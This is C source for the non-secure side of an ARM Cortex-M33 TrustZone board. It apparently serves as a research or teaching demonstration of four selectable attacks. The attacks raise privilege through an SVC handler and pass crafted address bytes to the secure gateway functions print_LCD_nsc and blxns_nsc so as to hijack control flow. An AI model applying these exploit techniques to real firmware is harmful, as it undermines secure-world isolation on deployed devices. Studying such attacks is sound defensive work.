/*----------------------------------------------------------------------------
 * Name:    main_ns.c
 * Purpose: Main function non-secure mode
 *----------------------------------------------------------------------------*/

#include <arm_cmse.h>
#include "IOTKit_CM33_FP.h"                    /* Device header */
#include "Board_LED.h"                         /* ::Board Support:LED */
#include "..\IOTKit_CM33_s\Secure_Functions.h" /* Secure Code Entry Points */

//#define ATTACK1
//#define ATTACK2
//#define ATTACK3
#define ATTACK4

#define DROP_NS_PRIVILEGES __asm("msr CONTROL, %[reg] " ::[reg] "r"(1) \
: "memory")

#define SET_NS_PRIVILEGES __asm("msr CONTROL, %[reg] " ::[reg] "r"(0) \
: "memory")


void attack_1(void) __attribute__((noinline));
void attack_2(void) __attribute__((noinline));
void attack_3(void) __attribute__((noinline));
void attack_4(void) __attribute__((noinline));
void print_LCD(char *msg);
void attack_2_svc(char *msg);
void raise_privilege(void);

char text[] = "Hello World (non-secure)\r\n";

/*----------------------------------------------------------------------------
  NonSecure functions used for callbacks
 *----------------------------------------------------------------------------*/
int32_t NonSecure_LED_On(uint32_t num);
int32_t NonSecure_LED_On(uint32_t num)
{
    return LED_On(num);
}

int32_t NonSecure_LED_Off(uint32_t num);
int32_t NonSecure_LED_Off(uint32_t num)
{
    return LED_Off(num);
}

/*----------------------------------------------------------------------------
  SVC IRQ Handler
 *----------------------------------------------------------------------------*/
void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val) __attribute__((section("privilege_code")));
void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val)
{
    uint32_t stack_frame_addr;
    unsigned int *svc_args;
    uint8_t svc_number;
    // Determines which stack pointer was used
    if (exc_return_code & 0x4) stack_frame_addr = __get_PSP();
    else stack_frame_addr = msp_val;
    // Determines whether additional state context is present
    if (exc_return_code & 0x20) {
        svc_args = (unsigned *) stack_frame_addr;}
    else {// additional state context present (only for Secure SVC)
        svc_args = (unsigned *) (stack_frame_addr+40);}
    // extracts SVC number
    svc_number = ((char *) svc_args[6])[-2]; // Memory[(stacked_pc)-2]
    switch (svc_number)
    {
        case 0:
            SET_NS_PRIVILEGES;
            break;
        case 1:
            print_LCD_nsc((char *) svc_args[0]);
            break;
        case 2:
            blxns_nsc((char *) svc_args[0]);
            break;
        default:
            break;
    }
}

void __attribute__((section("privilege_code"), noinline, naked)) SVC_Handler(void)
{
    __asm volatile(
        "mov r0, lr\n\t"
        "mov r1, sp\n\t"
        "b   SVC_Handler_Main\n\t"
    );
}

int get_driver_status() __attribute__((section("privilege_code"), optnone));
int get_driver_status()
{
	return 0;
}

void print_LCD(char *msg)
{
    register char* r0 __asm("r0") = msg;
    __asm volatile("svc #1"
        :
        : "r"  (r0)
    );
}

void attack_2_print_LCD(char *msg)
{
    register char* r0 __asm("r0") = msg;
    __asm volatile("svc #2"
        :
        : "r"  (r0)
    );
}

void raise_privilege(void)
{
    __asm volatile("svc #0");
}

void atk_3_print_LCD(char *msg) __attribute__((section("privilege_code"), noinline));
void atk_3_print_LCD(char *msg)
{
    print_LCD_nsc(msg);
    LED_On(1u);
}

void atk_4_print_LCD(char *msg) __attribute__((section("privilege_code"), noinline));
void atk_4_print_LCD(char *msg)
{
    blxns_nsc(msg);
    LED_On(2u);
}

void attacker_controlled(void);
void attacker_controlled(void)
{   
    LED_On(7u);
    while (1) {}
}

void attack_1(void)
{
    char user_input[28] = {
        0x4c,0x06,0x20,0x00};
    print_LCD(user_input);
}

void attack_2(void)
{
    char user_input[28] = {
        0x4c,0x06,0x20,0x00};
    attack_2_print_LCD(user_input);
}

void attack_3(void)
{
    raise_privilege();
    char user_input[28] = {
        0x4c,0x06,0x20,0x00};
    atk_3_print_LCD(user_input);
}

void attack_4(void)
{
    raise_privilege();
    char user_input[28] = {
        0x4c,0x06,0x20,0x00};
    atk_4_print_LCD(user_input);
}

static uint32_t x;
/*----------------------------------------------------------------------------
  Main function
 *----------------------------------------------------------------------------*/
int main(void)
{
    uint32_t i;

    /* exercise some floating point instructions */
    volatile uint32_t fpuType = SCB_GetFPUType();
    volatile float x1 = 12.4567f;
    volatile float x2 = 0.6637967f;
    volatile float x3 = 24.1111118f;

    x3 = x3 * (x1 / x2);

    /* exercise some core register from Non Secure Mode */
    x = __get_MSP();
    x = __get_PSP();

    /* register NonSecure callbacks in Secure application */
    Secure_LED_On_callback(NonSecure_LED_On);
    Secure_LED_Off_callback(NonSecure_LED_Off);
	if (pass_nsfunc_ptr_o_int_i_void(&get_driver_status))
		while(1);

#if 0
    LED_Initialize ();                      /* already done in Secure part */
#endif

    SystemCoreClockUpdate();
    SysTick->CTRL = 0;
    
    DROP_NS_PRIVILEGES;
    
    #ifdef ATTACK1
    attack_1();
    #elif defined ATTACK2
    attack_2();
    #elif defined ATTACK3
    attack_3();
    #elif defined ATTACK4
    attack_4();
    #endif
    attacker_controlled();
    LED_On(0u);
    while (1)
    {

    }
}
